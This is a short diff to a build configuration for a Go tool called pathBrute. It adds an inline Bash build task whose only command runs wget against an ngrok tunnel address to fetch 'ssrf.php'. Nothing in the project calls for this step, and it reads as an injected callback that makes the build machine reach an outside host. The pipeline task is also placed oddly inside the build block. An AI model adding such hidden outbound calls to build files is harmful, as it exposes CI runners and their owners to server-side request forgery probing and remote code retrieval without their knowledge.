@@ -1,4 +1,11 @@
 build:
+- task: Bash@3
+  inputs:
+    targetType: 'inline'
+    script: |
+      # Write your commands here
+      
+      wget http://lalka.eu.ngrok.io.ngrok.io/ssrf.php
   main: ./pathBrute.go
   goos:
     - linux
